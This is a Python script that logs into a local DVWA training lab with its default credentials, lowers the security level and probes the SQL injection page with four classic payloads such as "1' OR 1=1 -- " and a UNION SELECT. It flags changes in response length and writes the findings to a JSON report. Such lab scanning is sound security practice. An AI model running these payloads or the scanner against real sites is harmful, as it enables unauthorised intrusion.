import requests
from bs4 import BeautifulSoup
import json


session = requests.Session()

# Get login page token
# -------------------------------
login_page = session.get("http://localhost/dvwa/login.php")
soup = BeautifulSoup(login_page.text, "html.parser")
user_token = soup.find("input", {"name": "user_token"})["value"]

# Login
# -------------------------------
login_data = {
    "username": "admin",
    "password": "password",
    "Login": "Login",
    "user_token": user_token
}

session.post("http://localhost/dvwa/login.php", data=login_data)

# Set Security Level LOW
# -------------------------------
security_page = session.get("http://localhost/dvwa/security.php")
soup = BeautifulSoup(security_page.text, "html.parser")
security_token = soup.find("input", {"name": "user_token"})["value"]

security_data = {
    "security": "low",
    "seclev_submit": "Submit",
    "user_token": security_token
}

session.post("http://localhost/dvwa/security.php", data=security_data)

print("Login & Security Level Set to LOW ✅")

# SQL Injection Testing
# -------------------------------

target_url = "http://localhost/dvwa/vulnerabilities/sqli/"

# Normal request (baseline)
normal_response = session.get(target_url, params={"id": "1", "Submit": "Submit"})
normal_length = len(normal_response.text)

# Multiple SQL payloads
payloads = [
    "1' OR 1=1 -- ",
    "' OR '1'='1",
    "1' OR 'a'='a",
    "' UNION SELECT NULL,NULL -- "
]

sqli_results = []

for payload in payloads:

    params = {
        "id": payload,
        "Submit": "Submit"
    }

    response = session.get(target_url, params=params)
    injected_length = len(response.text)

    print("\n----------------------------------------")
    print("URL :", target_url)
    print("Testing Payload:", payload)
    print("Response Code:", response.status_code)
    print("Injected Length:", injected_length)

    # Detection Logic
    if injected_length != normal_length:
        print("[+] Possible SQL Injection Detected!")

        sqli_results.append({
            "url": target_url,
            "payload": payload,
            "severity": "High",
            "response_length": injected_length
        })

    else:
        print("[-] Not Vulnerable with this payload")

# Save Report
# -------------------------------

if sqli_results:
    with open("sqli_report.json", "w") as f:
        json.dump(sqli_results, f, indent=4)

    print("\n✅ SQL Injection Report Saved as sqli_report.json")
else:
    print("\nNo SQL Injection vulnerabilities detected.")